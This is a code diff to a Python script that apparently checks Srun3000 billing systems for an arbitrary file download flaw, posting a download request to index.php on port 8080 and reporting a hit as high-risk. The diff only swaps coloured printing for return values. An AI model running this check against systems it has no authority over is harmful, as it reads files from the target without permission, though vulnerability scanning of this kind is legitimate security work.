@@ -9,8 +9,6 @@ description: srun3000 8080端口文件index.php中,post参数ts=download&file=/s
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
 
 class srun_index_file_filedownload_BaseVerify:
     def __init__(self, url):
@@ -29,12 +27,13 @@ class srun_index_file_filedownload_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"hostname" in req.text and r"clientver" in req.text:
-                cprint("[+]存在深澜软件srun3000计费系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
-
+                return "[+]存在深澜软件srun3000计费系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
+            else:
+                return "[-]no vuln"
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]====>连接超时"
+
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = srun_index_file_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
